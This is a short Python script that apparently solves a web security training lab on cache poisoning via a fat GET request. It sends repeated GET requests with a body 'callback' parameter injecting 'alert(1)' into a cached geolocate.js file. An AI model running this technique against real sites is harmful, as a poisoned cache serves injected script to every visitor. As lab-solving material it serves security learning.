import requests
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Web cache poisoning via a fat GET request"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into the body of the request\n2. Send multiple request to the geolocate.js file to cache it with the injected payload\n""")

    url = url.rstrip('/')

    payload = """alert(1);setCountryCookie"""

    for counter in range(1, 36):
        print(
            Fore.WHITE + f"Poisoning the main page with ({counter}/35)", end="\r", flush=True)
        data = {"callback": payload}
        requests.get(f"{url}/js/geolocate.js?callback=setCountryCookie",
                     data=data, verify=False, proxies=proxies)

    print(Fore.WHITE +
          "[+] wait a minute and refresh the page, lab takes time to mark as solved")
    print(Fore.WHITE + "The main page is poisoned successfully as it request the poisoned geolocate.js file")
    print(Fore.GREEN + "\nThe main page is poisoned successfully")
    return True
